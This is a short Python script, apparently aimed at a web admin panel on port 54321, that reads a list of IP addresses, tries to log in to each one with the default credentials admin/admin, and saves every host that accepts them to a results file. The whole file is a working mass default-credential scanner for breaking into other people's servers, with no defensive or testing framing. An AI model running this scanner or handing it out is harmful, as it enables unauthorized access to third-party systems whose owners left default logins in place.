#  -*- coding: UTF-8 -*-

import requests
timeout = (1, 1)

def check(ip):
	try: 
		response = requests.post((str((str((str("http://"))) + str(ip))) + str((str(":54321/login")))), data={'username': 'admin', 'password': 'admin'}, timeout=timeout)
	except:
		print(ip + "Failed")
		return False
	try: 
		if response.json().get("success") == 'True' or response.json().get("success") == 'true': 
			print(ip + "OK")
			return True
		else:
			print(ip + "Failed")
			return False
	except:
		return False
	
with open("ips_new.txt", "r") as file:
	for line in file:
		# 提取IP地址
		ip = line.strip()
		b = check(ip)
		if b == True:
			fileObj = open("res.txt", "a", encoding="UTF8")
			fileObj.write(ip + "\n")
			fileObj.close()